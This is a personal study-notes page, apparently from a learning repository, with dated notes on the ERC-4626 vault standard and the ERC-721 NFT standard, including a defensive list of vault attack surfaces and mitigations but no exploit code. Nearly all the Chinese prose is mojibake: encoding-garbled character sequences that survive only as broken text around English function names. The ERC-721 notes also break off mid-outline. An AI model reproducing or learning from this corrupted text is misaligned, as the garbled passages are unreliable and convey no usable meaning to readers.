---
timezone: UTC+8
---

# Ray

**GitHub ID:** 3956ray

**Telegram:** @mmm lll

## Self-introduction

æˆ‘æ˜¯Rayï¼Œ

## Notes

<!-- Content_START -->
# 2025-08-21

# ERC 4626
1) è§„èŒƒå…¨æ™¯ï¼ˆæ¥å£ã€äº‹ä»¶ã€è¾¹ç•Œã€å®ç°è‡ªç”±åº¦ï¼‰
- æ ¸å¿ƒæ¦‚å¿µ
  - èµ„äº§ assetsï¼šVault æ‰€æ‰˜ç®¡çš„åº•å±‚ ERCâ€‘20 ä»£å¸ï¼ˆèµ„äº§ä¾§ï¼‰ã€‚
  - ä»½é¢ sharesï¼šVault å¯¹ç”¨æˆ·çš„å‡­è¯ï¼ˆä»½é¢ä¾§ï¼Œæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ª ERCâ€‘20ï¼‰ã€‚
  - ä»·æ ¼ price-per-shareï¼ˆppsï¼‰ï¼špps = totalAssets / totalSupplyï¼ˆæ³¨æ„èˆå…¥ä¸ 0 ä¾›ç»™åœºæ™¯ï¼‰ã€‚
- å¿…é€‰æ¥å£ï¼ˆå…³é”®å‡½æ•°æ—ï¼‰
  - èµ„äº§ä¸ä¼šè®¡ï¼šasset()ã€totalAssets()
  - è½¬æ¢ï¼šconvertToShares(assets)ã€convertToAssets(shares)
  - é¢„è§ˆï¼špreviewDepositã€previewMintã€previewWithdrawã€previewRedeem
  - ä¸Šé™ï¼šmaxDepositã€maxMintã€maxWithdrawã€maxRedeem
  - æ ¸å¿ƒåŠ¨ä½œï¼šdepositã€mintã€withdrawã€redeem
- äº‹ä»¶
  - Deposit(caller, owner, assets, shares)
  - Withdraw(caller, receiver, owner, assets, shares)
  - å¦å¤–è¿˜ä¼šæœ‰ ERCâ€‘20 çš„ Transfer/Approval äº‹ä»¶ï¼ˆé’ˆå¯¹ sharesï¼‰
- è¾¹ç•Œä¸çº¦æŸ
  - é¢„è§ˆå‡½æ•°ä¸åº”ä¿®æ”¹çŠ¶æ€ï¼Œåº”ä¸å®é™…æ‰§è¡Œè·¯å¾„çš„èˆå…¥æ–¹å‘ä¿æŒä¸€è‡´ã€‚
  - maxXxx ç”¨äºä¼ è¾¾å¯è¡Œè¾¹ç•Œï¼ˆé¢åº¦/æµåŠ¨æ€§/ç­–ç•¥é™åˆ¶ï¼‰ï¼Œåšä¸ºè·¯ç”±ä¸å‰ç«¯çš„â€œæŠ¤æ â€ã€‚
  - totalAssets å¯ä¸ºâ€œçœŸå®ä½™é¢ + ç­–ç•¥åº”è®¡â€ï¼Œå®ç°è€…æœ‰è‡ªç”±åº¦ï¼Œä½†å¿…é¡»ä¸å®é™…å¯æå–ä»·å€¼ç›¸ç¬¦ã€‚
- å®ç°è‡ªç”±åº¦ä¸å¸¸è§è£å‰ªç‚¹ï¼ˆä»¥åº“ä¸ºå‚ç…§ï¼‰
  - åˆå§‹å…‘æ¢ç‡ï¼šå½“ totalSupply == 0 æ—¶çš„ sharesâ†”assets åˆå§‹æ¯”ç‡ï¼Œå¤šæ•°å®ç°é»˜è®¤ 1:1ï¼Œä¹Ÿå¯è‡ªå®šä¹‰ï¼ˆéœ€æ¸…æ™°æ–‡æ¡£åŒ–ï¼‰ã€‚
  - decimalsï¼šOZ ä¼šå°è¯•ä¸åº•å±‚èµ„äº§ decimals å¯¹é½ï¼›SM é»˜è®¤ 18ï¼Œå¯è‡ªå®šä¹‰æ„é€ ã€‚
  - max ç³»åˆ—é»˜è®¤è¡Œä¸ºï¼šé€šå¸¸é»˜è®¤æ— é™æˆ–ä¸é™åˆ¶ï¼Œä½†ç”Ÿäº§ä¸Šåº”ç»“åˆé£æ§/é˜Ÿåˆ—/ç­–ç•¥æµåŠ¨æ€§è¿›è¡Œçº¦æŸã€‚
  - ç­–ç•¥/è´¹ç”¨æ‰©å±•ï¼šè§„èŒƒä¸å« fee æ¨¡å‹ä¸ç­–ç•¥æ¥å£ï¼Œå®ç°å¯åœ¨å†…éƒ¨æ‰©å±•ï¼ˆä¾‹å¦‚æ‰£è´¹é“¸ä»½æœºåˆ¶ã€harvest é’©å­ç­‰ï¼‰ã€‚

2) å‡½æ•°è¯­ä¹‰ä¸èˆå…¥ï¼ˆæ•°å­¦å…³ç³»ã€å•è°ƒæ€§ã€æç«¯åœºæ™¯ï¼‰
- æ•°å­¦å…³ç³»ï¼ˆå¸¸è§å®‰å…¨èˆå…¥çº¦å®šï¼‰
  - shares = assets * totalSupply / totalAssets
  - assets = shares * totalAssets / totalSupply
  - å…¸å‹èˆå…¥æ–¹å‘ï¼ˆä¿æŒç”¨æˆ·ä¸åƒäº/é‡‘åº“ä¸åƒäºçš„ä¸€è‡´æ€§ï¼‰
    - previewDeposit(assets) â†’ shares ä½¿ç”¨å‘ä¸‹å–æ•´ floorï¼ˆé¿å…è¿‡åº¦å‘æ”¾ sharesï¼‰
    - previewMint(shares) â†’ assets ä½¿ç”¨å‘ä¸Šå–æ•´ ceilï¼ˆç¡®ä¿ä»˜è¶³èµ„äº§æ‰èƒ½é“¸å¾— sharesï¼‰
    - previewWithdraw(assets) â†’ shares ä½¿ç”¨å‘ä¸Šå–æ•´ ceilï¼ˆç¡®ä¿çƒ§è¶³ shares æ‰èƒ½å–å‡ºèµ„äº§ï¼‰
    - previewRedeem(shares) â†’ assets ä½¿ç”¨å‘ä¸‹å–æ•´ floorï¼ˆé¿å…è¿‡åº¦æ”¯ä»˜èµ„äº§ï¼‰
  - å•è°ƒæ€§è¦æ±‚ï¼šèµ„äº§ä¸ä»½é¢çš„åŒå‘è½¬æ¢åº”å•è°ƒï¼›totalAssets/totalSupply çš„å˜åŒ–åº”ä¸€è‡´åæ˜ åœ¨ preview ä¸å®é™…æ‰§è¡Œä¸Šã€‚
- ä¸ preview/max/totalAssets çš„ä¸€è‡´æ€§
  - previewXxx ä¸å®é™… deposit/mint/withdraw/redeem çš„å†…éƒ¨è®¡ç®—å¿…é¡»åŒå‘èˆå…¥ï¼Œå¦åˆ™å°†è¢«å¯åˆ©ç”¨ä¸ºæŠ¥ä»·æ¬ºè¯ˆ/æ‹’ç»æœåŠ¡ã€‚
  - maxXxx åº”è€ƒè™‘æµåŠ¨æ€§ä¸é™åˆ¶ï¼šä¾‹å¦‚ç­–ç•¥èµ„é‡‘å›æµå»¶è¿Ÿã€ææ¬¾é˜Ÿåˆ—ã€é¢åº¦ä¸Šé™ä¸è§’è‰²æƒé™ï¼›å¹¶ä¸”ä¸ revert æ¡ä»¶å¯¹åº”ã€‚
- æç«¯åœºæ™¯å»ºè®®
  - æµåŠ¨æ€§ä¸è¶³ï¼šmaxWithdraw/maxRedeem è¿”å›ä½å€¼ï¼›withdraw/redeem ä¸åº”â€œéƒ¨åˆ†æˆäº¤â€ï¼Œè€Œæ˜¯é€šè¿‡ max æŠ¤æ å¼•å¯¼ä¸Šå±‚åˆ†æ‹†è¯·æ±‚ã€‚
  - 0/1 æœ€å°ä»½é¢ï¼šé¿å…åˆå§‹å°é¢å¯¼è‡´åç»­å››èˆäº”å…¥é”å°˜ã€‚å¸¸è§åšæ³•ï¼šç”±æ²»ç†è´¦æˆ·è¿›è¡Œ seed deposit æˆ–åœ¨é¦–æ¬¡ deposit å¼ºåˆ¶æœ€å°è§„æ¨¡ï¼ˆå¹¶æ–‡æ¡£åŒ–ï¼‰ã€‚
  - ç²¾åº¦å·®å¼‚ï¼šèµ„äº§ä¸ä»½é¢ decimals ä¸åŒï¼ˆå¦‚ 6 vs 18ï¼‰ï¼ŒåŠ¡å¿…ä½¿ç”¨å®‰å…¨çš„ä¹˜é™¤é¡ºåºä¸ mulDivDown/Upï¼ˆSMï¼‰æˆ– OZ çš„ Math åº“ï¼Œé¿å…ä¸­é—´æº¢å‡ºä¸ç²¾åº¦ä¸¢å¤±ã€‚
  - éæ ‡å‡†èµ„äº§ï¼šfeeâ€‘onâ€‘transfer æˆ– rebasing èµ„äº§å¯¼è‡´â€œè½¬è´¦å…¥è´¦å€¼ â‰  è¯·æ±‚å€¼â€ï¼Œpreview å¿…é¡»ä¸å®é™…è·¯å¾„å¯¹é½ï¼ˆè¯¦è§ç¬¬ 5 ç‚¹ï¼‰ã€‚

3) æŠ€æœ¯æ¼”è¿›ä¸å®ç°å¯¹æ¯”
- å˜æ›´ç‚¹ä¸å·²çŸ¥å‘ï¼ˆå‚è€ƒ 2022â€“2025 ï¼‰
  - èˆå…¥ç­–ç•¥è¶‹äºç»Ÿä¸€ï¼šç¤¾åŒºå·²åŸºæœ¬å½¢æˆä¸Šè¿°å››æ¡è·¯å¾„çš„â€œfloor/ceilâ€çº¦å®šï¼Œé¿å…æŠ¥ä»·å‰åä¸ä¸€è‡´ã€‚
  - preview ä¸€è‡´æ€§æ„è¯†å¢å¼ºï¼šæ—©æœŸå¸¸è§â€œpreview ä¹è§‚ï¼Œå®é™…æ›´ä¿å®ˆâ€å¯¼è‡´è·¯ç”±å¤±è´¥æˆ–å¯è¢«åšå¼ˆï¼Œç°åº”ç¡®ä¿çº¯å‡½æ•°é€»è¾‘ä¸å®é™…æ‰§è¡Œå¤ç”¨åŒä¸€è®¡ç®—è·¯å¾„ã€‚
  - fee è®¡æä¸ä¼šè®¡ä¸€è‡´æ€§ï¼šä»â€œç›´æ¥æ‰£èµ„äº§â€é€æ­¥å€¾å‘â€œé“¸ä»½åˆ° feeRecipientâ€å¹¶ä¿æŒè€æŒæœ‰äººä¸å—æŸï¼ˆæŠ—ç¨€é‡Šè®¾è®¡ï¼‰ï¼Œå¹¶åœ¨äº‹ä»¶ä¸­é€æ˜åŒ–ã€‚
  - rebasing å…¼å®¹ï¼štotalAssets éœ€ä»¥â€œå¯æå–ä»·å€¼â€ä¸ºå‡†ï¼Œé¿å…å•çœ‹ balanceOf æˆ–é”™è¯¯ç¼“å­˜ï¼›å¯¹ rebase äº‹ä»¶éœ€æœ‰é˜²å¾¡/æ ¡éªŒã€‚
  - max å‡½æ•°å®‰å…¨æŠ¤æ ï¼šä»é»˜è®¤æ— é™ï¼Œæ¼”è¿›ä¸ºè€ƒè™‘ææ¬¾é˜Ÿåˆ—ã€å»¶æ—¶ã€è§’è‰²å¼€å…³ã€å†»ç»“æ¨¡å¼ï¼ˆwithdraw-onlyï¼‰ï¼Œä»¥å‡å°‘è¿è¡ŒæœŸé£é™©ã€‚
- åº“å®ç°å¯¹æ¯”ï¼ˆOZ v5 vs Solmateï¼‰
  - å®‰å…¨æ€§ä¸å®Œå¤‡åº¦ï¼šOZ åå®‰å…¨ä¿å®ˆï¼Œé»˜è®¤ SafeERC20ã€å¯¹ decimals ä¸ return å€¼æ›´ç¨³å¦¥ï¼›SM åæç®€ä¸ gas ä¼˜åŒ–ï¼Œæä¾› mulDivDown/Up ç­‰æ•°å­¦å·¥å…·ï¼Œè¦æ±‚ä½¿ç”¨è€…æ›´è‡ªå¾‹ã€‚
  - èˆå…¥å®ç°ï¼šä¸¤è€…å‡æä¾› Down/Up è·¯å¾„ï¼Œä½† OZ æ›´æ³¨é‡ä¸ ERCâ€‘20 ç”Ÿæ€çš„â€œéæ ‡å‡†è¿”å›å€¼/å¤±è´¥â€é€‚é…ï¼›SM æ›´æ¸…æ™°åœ°æš´éœ²å‘ä¸Š/å‘ä¸‹çš„é€‰æ‹©æƒä¸æˆæœ¬ã€‚
  - decimalsï¼šOZ ç»å¸¸å¯¹é½åº•å±‚èµ„äº§ç²¾åº¦ï¼Œé™ä½é›†æˆå¤æ‚åº¦ï¼›SM å¸¸ç”±å¼€å‘è€…åœ¨æ„é€ å‡½æ•°ä¸­æ˜¾å¼è®¾å®šï¼Œçµæ´»ä½†éœ€è°¨æ…ã€‚
  - maxXxx é»˜è®¤ï¼šä¸¤è€…é»˜è®¤éƒ½è¾ƒå®½æ¾ï¼›ç”Ÿäº§åº”è¦†å†™ä»¥æ¥å…¥é™é¢ä¸é£æ§é€»è¾‘ï¼ˆå¦‚ç®¡ç†ä¾§é™é¢ã€ç­–ç•¥ä¾§å¯ç”¨æµåŠ¨æ€§ã€é»‘ç™½åå•ï¼‰ã€‚
  - æ‰©å±•ä¸ç»„åˆï¼šOZ ä¸ä¸Šå±‚ RBACã€Pausableã€UUPS å‡çº§æ¨¡å¼æ•´åˆåº¦é«˜ï¼›SM ä¸è‡ªå®šä¹‰ç­–ç•¥/æ•°å­¦åº“/æ±‡æ€»å™¨ç»„åˆè‡ªç”±åº¦é«˜ã€‚

4) å®‰å…¨ä¸ä¸å˜å¼ï¼ˆæ”»å‡»é¢ã€PoC åœºæ™¯ã€ç¼“è§£å»ºè®®ï¼‰
- æ”»å‡»é¢ä¸è¯¯ç”¨æ¸…å•
  - preview ä¸å®é™…ä¸ä¸€è‡´ï¼šè·¯ç”±/èšåˆå™¨è¢«â€œä¹è§‚æŠ¥ä»·â€è¯¯å¯¼ï¼Œç”¨æˆ·æˆ–åè®®é­é‡å¤±è´¥/æ»‘ç‚¹è¿‡å¤§ã€‚
    - é˜²å¾¡ï¼šå…¬ç”¨åŒä¸€è½¬æ¢å‡½æ•°ï¼›æµ‹è¯•è¦†ç›–â€œpreview == å®é™…è·¯å¾„â€æ–­è¨€ï¼›å¼•å…¥ max æŠ¤æ ã€‚
  - ä»½é¢ç¨€é‡Š/è†¨èƒ€ï¼šfee è®¡ææˆ–æèµ  donation é¡ºåºä¸å½“ï¼Œå¯¼è‡´è€æŒæœ‰äººæƒç›Šå—æŸã€‚
    - é˜²å¾¡ï¼šé‡‡ç”¨â€œç»™ feeRecipient é“¸ä»½â€è€Œéç›´æ¥æ‰£åº•å±‚èµ„äº§ï¼›åœ¨äº‹ä»¶ä¸­é€æ˜åŒ–ï¼›åŠ å…¥ä¸Š/ä¸‹é™ä¸å»¶æ—¶æ²»ç†ã€‚
  - é—ªç”µè´·æ“çºµ totalAssets/ppsï¼šç¬é—´å­˜å–/donate å¹²æ‰°æŠ¥ä»·æˆ–æ¸…ç®—ã€‚
    - é˜²å¾¡ï¼šå¯¹å…³é”®æ“ä½œä½¿ç”¨ TWAP æˆ–å»¶è¿Ÿç»“ç®—ï¼›ç­–ç•¥ä¾§å¿«ç…§ï¼›åœ¨è·¯ç”±ä¾§åŠ å¤§æ»‘ç‚¹ä¿æŠ¤ä¸å¤šæºæŠ¥ä»·ã€‚
  - éæ ‡å‡† ERCâ€‘20ï¼šfeeâ€‘onâ€‘transfer/rebasing å¯¼è‡´ä¼šè®¡é”™é…ä¸äº‹ä»¶ä¸ä¸€è‡´ã€‚
    - é˜²å¾¡ï¼šä»¥å®é™…å…¥è´¦/å‡ºè´¦ä¸ºå‡†æ›´æ–°ä¼šè®¡ï¼›å¯¹ rebasing é‡‡ç”¨â€œæ‹‰å–å¼è¯»å– + ä¸Šä¸‹é™æ ¡éªŒâ€ï¼›åœ¨ max/preview ä¸­ä½“ç°çœŸå®é™åˆ¶ã€‚
  - æˆæƒä¸é‡å…¥ï¼šshares æ˜¯ ERCâ€‘20ï¼Œè‹¥å åŠ  777/1363 æˆ–å¤–éƒ¨å›è°ƒç­–ç•¥ï¼Œéœ€é˜²é‡å…¥ä¸æƒé™æ»¥ç”¨ã€‚
    - é˜²å¾¡ï¼šReentrancyGuardï¼›pull æ¨¡å¼ï¼›å¤–éƒ¨è°ƒç”¨æœ€å°åŒ–ï¼›ä¸¥æ ¼çš„è§’è‰²ä¸å»¶æ—¶ï¼Œç¦æ­¢åœ¨å…³é”®è·¯å¾„ä¸­å¯é‡å…¥å¤–éƒ¨åˆçº¦ã€‚
  - äº‹ä»¶ä¸çŠ¶æ€ä¸ä¸€è‡´ï¼šDeposit/Withdraw ä¸ ERCâ€‘20 Transfer æ¬¡åºæˆ–æ•°é‡ä¸ä¸€è‡´ï¼Œå½±å“ç´¢å¼•ä¸åˆè§„å®¡è®¡ã€‚
    - é˜²å¾¡ï¼šæµ‹è¯•æ–­è¨€äº‹ä»¶ä¸çŠ¶æ€çš„ä¸€è‡´æ€§ï¼›å¤±è´¥å³å›æ»šã€‚
  - permit/nonceï¼šè‹¥ shares å®ç°äº† EIPâ€‘2612ï¼Œå¿…é¡»ä¿è¯ nonce å•è°ƒä¸åŸŸåˆ†éš”æ­£ç¡®ã€‚
    - é˜²å¾¡ï¼šè¦†ç›– chainId å˜åŒ–ï¼›deadline æ£€æŸ¥ï¼›é‡æ”¾é˜²æŠ¤ã€‚
- å…³é”®ä¸å˜å¼ï¼ˆå»ºè®®çº³å…¥ invariant/fuzzï¼‰
  - ä¼šè®¡å®ˆæ’ï¼šsum(userShares) == totalSupplyï¼›convert/preview ä¸ totalAssets/totalSupply ä¸€è‡´ã€‚
  - ä»·æ ¼å•è°ƒï¼šæ— å¤–éƒ¨æ³¨å…¥/æ‰£å‡æ—¶ï¼Œpps å˜åŒ–åº”å¯è§£é‡Šä¸”ä¸ fee/æ”¶ç›Šäº‹ä»¶ä¸€è‡´ã€‚
  - äº‹ä»¶ä¸€è‡´æ€§ï¼šDeposit/Withdraw ä¸ ERCâ€‘20 Transfer äº‹ä»¶å¯¹åº”å…³ç³»ä¸€è‡´ã€‚
  - é¢„è§ˆä¸€è‡´ï¼špreviewXxx çš„ç»“æœä¸å®é™…è·¯å¾„ç›¸åŒçš„èˆå…¥æ–¹å‘ä¸è¾¹ç•Œã€‚
  - è®¸å¯å®‰å…¨ï¼ˆå¯é€‰ï¼‰ï¼špermit nonce å•è°ƒé€’å¢ï¼›ç­¾ååŸŸåˆ†éš”ä¸å˜ã€‚

5) ç”Ÿæ€åº”ç”¨ä¸å…¼å®¹æ€§ï¼ˆDEX/å€Ÿè´·/èšåˆå™¨/æ”¶ç›Šé‡‘åº“/LST/LRT/RWAï¼‰
- DEX/è·¯ç”±
  - ä¸€äº›è·¯ç”±æ”¯æŒ 4626 åŒ…è£…/è§£åŒ…ï¼ˆwrap/unwrapï¼‰è·¯å¾„ï¼›è‹¥æœªåŸç”Ÿæ”¯æŒï¼Œéœ€äº‹å…ˆ unwrap æˆ assets å†äº¤æ˜“ã€‚
  - æŠ¥ä»·ä¸æ»‘ç‚¹ï¼šåŠ¡å¿…ä½¿ç”¨ preview + max æŠ¤æ ï¼Œå¹¶è€ƒè™‘ flash/donation å¹²æ‰°å¯¼è‡´çš„ pps åç§»ã€‚
- å€Ÿè´·/æŠµæŠ¼
  - æŠµæŠ¼å“å®šä»·ï¼šä»¥ pps * assetPriceï¼›è‹¥ç­–ç•¥æ”¶ç›Šå—å»¶è¿Ÿæˆ–é¢„ä¼°ï¼Œåº”é‡‡ç”¨ TWAP/é¢„è¨€æœºä¸å®‰å…¨è¾¹ç•Œã€‚
  - æ¸…ç®—ï¼šèµå›è·¯å¾„éœ€æœ‰è¶³å¤ŸæµåŠ¨æ€§ï¼›å¯¹ææ¬¾é˜Ÿåˆ—æˆ–å»¶æ—¶åšé£æ§å‚æ•°ä¸æ–‡æ¡£åŒ–ã€‚
- èšåˆå™¨/æ”¶ç›Šé‡‘åº“ï¼ˆVault-of-Vaultsï¼‰
  - ç»„åˆå¤šå±‚ 4626 å®¹æ˜“äº§ç”Ÿèˆå…¥è¿é”è¯¯å·®ï¼›å»ºè®®åœ¨ä¸Šå±‚è¿›è¡Œæ‰¹é‡åŒ–ä¸å¯¹å†² roundingï¼Œæˆ–ç»Ÿä¸€å‘ä¸Š/å‘ä¸‹ç­–ç•¥ã€‚
  - å¤æ‚ fee æ¨¡å‹å åŠ æ—¶ï¼Œæµ‹è¯•â€œå¤š hop + fee + rebaseâ€çš„è¾¹ç•Œè·¯å¾„ã€‚
- LST/LRTï¼ˆè´¨æŠ¼è¡ç”Ÿï¼‰
  - pps å•è°ƒä¸Šè¡Œæ˜¯ä¸»é¢„æœŸï¼›éœ€é˜²æ­¢ large donation/fee äº‹ä»¶é€ æˆçŸ­æ—¶è·³å˜å†²å‡»èšåˆå™¨ã€‚
  - ä¸å…±è¯†å±‚èµå›/å†è´¨æŠ¼å‘¨æœŸè”åŠ¨ï¼Œè®¾ç½® maxWithdraw/maxRedeem çš„æ—¶é—´çª—çº¦æŸã€‚
- RWA æ‰˜ç®¡
  - totalAssets å¯èƒ½ä¾èµ–æ‰˜ç®¡æ¸…ç®—å‘¨æœŸ/ä¼°å€¼ï¼›å¿…é¡»åœ¨æ–‡æ¡£/äº‹ä»¶ä¸­é€æ˜åŒ–ä¼°å€¼å»¶è¿Ÿï¼Œé¿å…èµå›æŒ¤å…‘ã€‚
- éæ ‡å‡†èµ„äº§é€‚é…
  - feeâ€‘onâ€‘transferï¼šä»¥å®é™…å…¥è´¦é‡‘é¢è®°è´¦ï¼›preview åº”ä»¥â€œé¢„ä¼°å®é™…å…¥è´¦â€ä¸ºå‡†ï¼ˆæˆ–åœ¨ UI/è·¯ç”±å±‚è®¾ç½®å®‰å…¨æŠ˜æ‰£ï¼‰ï¼›äº‹ä»¶ä½¿ç”¨å®é™…é‡‘é¢ã€‚
  - rebasingï¼šé¿å…ç¼“å­˜èµ„äº§ä½™é¢ï¼›convert åŸºäºæœ€æ–° balanceOfï¼›å¿…è¦æ—¶åŠ å…¥â€œå¯æç°ä¸Šé™â€ä¸â€œæœ€å°èµå›å•ä½â€ä¿æŠ¤ã€‚
  - ç¨è´¹/é»‘åå•ï¼šmaxXxx åº”åæ˜ é™åˆ¶ï¼›å¤±è´¥è·¯å¾„æ¸…æ™°å›æ»šä¸é”™è¯¯ä¿¡æ¯ï¼›å¿…è¦æ—¶åŠ å…¥ç™½åå•ä¸å¯æš‚åœå¼€å…³ã€‚

- å¼€å‘ä¾§
  - ç»Ÿä¸€è½¬æ¢è·¯å¾„ï¼šå°† convert/preview ä¸å®é™…æ‰§è¡Œå…±äº«åŒä¸€å†…éƒ¨å‡½æ•°ï¼Œç¡®ä¿ä¸€è‡´æ€§ã€‚
  - èˆå…¥ç­–ç•¥å›ºå®šå¹¶æ–‡æ¡£åŒ–ï¼šæŒ‰â€œdeposit/redeem å‘ä¸‹ï¼›mint/withdraw å‘ä¸Šâ€å®æ–½ï¼Œå†™å…¥æ³¨é‡Šä¸ NatSpecã€‚
  - maxXxx æ¥å…¥é£æ§ï¼šé¢åº¦ã€é˜Ÿåˆ—ã€å»¶æ—¶ã€ç­–ç•¥æµåŠ¨æ€§ã€é»‘ç™½åå•ï¼›å¯¹å¤–æŠ«éœ²æ²»ç†å‚æ•°ã€‚
  - äº‹ä»¶å®Œæ•´ï¼šDeposit/Withdraw ä¸ Transfer é¡ºåºä¸æ•°é¢ä¸€è‡´ï¼›å¼‚å¸¸è·¯å¾„å…¨å›æ»šã€‚
  - èµ„äº§å…¼å®¹å±‚ï¼šæŠ½è±¡ä¸€ä¸ª SafeAsset é€‚é…å±‚ï¼Œå¤„ç† feeâ€‘onâ€‘transfer/éæ ‡å‡†è¿”å›å€¼ï¼›å¯¹ rebasing åšè¯»å–ä¸ä¸Š/ä¸‹é™æ ¡éªŒã€‚
  - æ€§èƒ½ï¼šç¼“å­˜ä¸å¯å˜çš„ decimalsï¼›ä½¿ç”¨å®‰å…¨çš„ mulDivDown/Upï¼›é¿å…é‡å¤å¤–éƒ¨è°ƒç”¨ï¼›æ‰¹é‡æ“ä½œä¸ unchecked å®‰å…¨ä½¿ç”¨ã€‚
- æµ‹è¯•ä¾§ï¼ˆFoundry å»ºè®®ï¼‰
  - å•æµ‹ï¼šå››æ¡ä¸»è·¯å¾„ + preview/convert/max/totalAssets/decimalsï¼›äº‹ä»¶å¯¹é½ã€‚
  - Fuzzï¼šéšæœºå¤šç”¨æˆ·å¤šåºåˆ—å­˜å–èµå›ï¼›å¼•å…¥ donationã€é—ªç”µè´·æ‰°åŠ¨ã€‚
  - Invariantï¼šä¼šè®¡å®ˆæ’ã€äº‹ä»¶ä¸€è‡´ã€preview ä¸€è‡´ã€pps å•è°ƒ/å¯è§£é‡Šã€‚
  - éæ ‡å‡†èµ„äº§æ¨¡æ‹Ÿï¼šfeeâ€‘onâ€‘transferã€rebasingã€æ‹’æ”¶/å»¶è¿Ÿã€è¿”å›å€¼éæ ‡å‡†ã€‚
- è¿ç»´ä¸ç›‘æ§
  - æŒ‡æ ‡ï¼štotalAssetsã€totalSupplyã€ppsã€maxXxxã€å¤±è´¥ç‡ã€fee é€Ÿç‡ã€harvest é—´éš”ã€‚
  - å‘Šè­¦ï¼špreview ä¸å®é™…åå·®é˜ˆå€¼ã€pps çªå˜ã€rebase å¼‚å¸¸ã€ææ¬¾é˜Ÿåˆ—æ‹¥å¡ã€‚
  - åº”æ€¥ï¼šPausable/Guardianï¼›åªææ¬¾æ¨¡å¼ï¼›ç­–ç•¥ä¸‹çº¿/åˆ‡æ¢æµç¨‹ï¼›å‚æ•°å˜æ›´ä¸å»¶æ—¶æ²»ç†ã€‚
- å‡çº§ä¸æƒé™ï¼ˆè‹¥ç”¨å¯å‡çº§æ¨¡å¼ï¼‰
  - è§’è‰²çŸ©é˜µï¼šOwner/Admin/Guardian/Strategy/Harvesterï¼›æœ€å°æˆæƒ + timelockã€‚
  - å­˜å‚¨æ§½ä¸ __gap ç¨³å®šï¼›å‡çº§å›å½’æµ‹è¯•è¦†ç›– rounding/fee/preview ä¸€è‡´æ€§ï¼›çŠ¶æ€å¿«ç…§å‰åå¯¹è´¦ã€‚

# 2025-08-20

ä¸€ã€å®šä¹‰ä¸èƒŒæ™¯
- å®šä¹‰ï¼šERCâ€‘721 æ˜¯ä»¥å¤ªåŠæœ€æ—©ã€æœ€å¹¿æ³›ä½¿ç”¨çš„â€œéåŒè´¨åŒ–ä»£å¸â€ï¼ˆNFTï¼‰æ ‡å‡†ï¼Œæ ¸å¿ƒç‰¹æ€§æ˜¯â€œå”¯ä¸€æ€§ + å¯ç¡®æƒå½’å±â€ï¼Œæ¯ä¸ª tokenId ä»£è¡¨ä¸€ä¸ªä¸å¯äº’æ¢çš„èµ„äº§å•å…ƒã€‚
- æ ‡å‡†ç›®æ ‡ï¼š
  - æ ‡å‡†åŒ–æ‹¥æœ‰è€…æŸ¥è¯¢ã€è½¬ç§»ã€æˆæƒä¸å…ƒæ•°æ®è®¿é—®çš„æ¥å£ï¼›
  - ä¸ºåˆçº¦é—´ NFT äº¤äº’æä¾›å¼ºçº¦æŸï¼ˆå¦‚ safeTransfer çš„åˆçº¦æ¥æ”¶å›è°ƒï¼‰ï¼›
  - ä¸é’±åŒ…ã€å¸‚åœºã€æµè§ˆå™¨ç­‰åŸºç¡€è®¾æ–½çš„äº’æ“ä½œæ€§ã€‚
- å¯¹æ¯” ERCâ€‘20/EIPâ€‘1155ï¼š
  - ERCâ€‘20 å¯æ›¿ä»£ï¼›ERCâ€‘721 å®Œå…¨éåŒè´¨ï¼›
  - ERCâ€‘1155 ä¸ºå¤šä»£å¸/åŠåŒè´¨æ¨¡å‹ï¼Œé€‚åˆå¤§è§„æ¨¡é“¸é€ ä¸æ‰¹é‡è½¬ç§»ï¼›ERCâ€‘721 æ›´å¼ºè°ƒ â€œæ¯ä¸ª tokenId æ˜¯ç‹¬ç«‹å®ä½“â€ã€‚

äºŒã€æ ¸å¿ƒæ¥å£ä¸äº‹ä»¶
- IERC165ï¼šæ¥å£æ£€æµ‹
  - åˆçº¦éœ€å®ç° supportsInterface(bytes4 interfaceId)
- IERC721ï¼šæ ¸å¿ƒ
  - balanceOf(owner)ã€ownerOf(tokenId)
  - approve(to, tokenId)ã€getApproved(tokenId)ã€setApprovalForAll(operator, approved)ã€isApprovedForAll(owner, operator)
  - transferFrom(from, to, tokenId)ã€safeTransferFrom(from, to, tokenId[, data])
  - äº‹ä»¶ï¼šTransferã€Approvalã€ApprovalForAll
- IERC721Receiverï¼šåˆçº¦å®‰å…¨æ¥æ”¶å›è°ƒ
  - onERC721Received(operator, from, tokenId, data) -> bytes4
  - safeTransferFrom è‹¥ç›®æ ‡æ˜¯åˆçº¦ï¼Œå¿…é¡»è¿”å›æ­£ç¡®çš„ selectorï¼Œå¦åˆ™ revert
- IERC721Metadataï¼ˆå¯é€‰ä½†è¡Œä¸šäº‹å®æ ‡å‡†ï¼‰
  - name()ã€symbol()ã€tokenURI(tokenId)
- IERC721Enumerableï¼ˆå¯é€‰ï¼Œä¸å†æ¨èç”¨äºå¤§è§„æ¨¡é›†åˆï¼‰
  - tokenOfOwnerByIndexã€totalSupplyã€tokenByIndexï¼ˆé“¾ä¸Šæšä¸¾æˆæœ¬é«˜ï¼‰
- å¸¸è§æ‰©å±•
  - EIPâ€‘2981: ç‰ˆç¨æ ‡å‡†ï¼ˆroyaltyInfoï¼‰
  - EIPâ€‘2309: æ‰¹é‡é“¸é€ äº‹ä»¶ï¼ˆConsecutiveTransferï¼‰ç”¨äºéƒ¨ç½²æœŸå¤§æ‰¹é‡ mint è®°è´¦
  - EIPâ€‘4494: NFT Permitï¼ˆç­¾åæˆæƒï¼Œæ— éœ€å…ˆ on-chain approveï¼‰
  - EIPâ€‘4907: å¯ç§Ÿç”¨è§’è‰²ï¼ˆuser/expiryï¼‰

ä¸‰ã€å®ç°è¦ç‚¹ä¸å­˜å‚¨ç»“æ„
- å…¸å‹å­˜å‚¨
  - mapping(uint256 => address) _ownerOf
  - mapping(address => uint256) _balanceOf
  - mapping(uint256 => address) _tokenApprovals
  - mapping(address => mapping(address => bool)) _operatorApprovals
- å¿…å¤‡ä¸å˜é‡
  - ownerOf(tokenId) éé›¶åœ°å€ä»£è¡¨å·²å­˜åœ¨
  - balanceOf ä¸ Transfer äº‹ä»¶ä¿æŒä¸€è‡´æ€§
  - è½¬ç§»ååº”æ¸…ç©º token çº§åˆ«çš„ single-approval
- è½¬ç§»å®‰å…¨
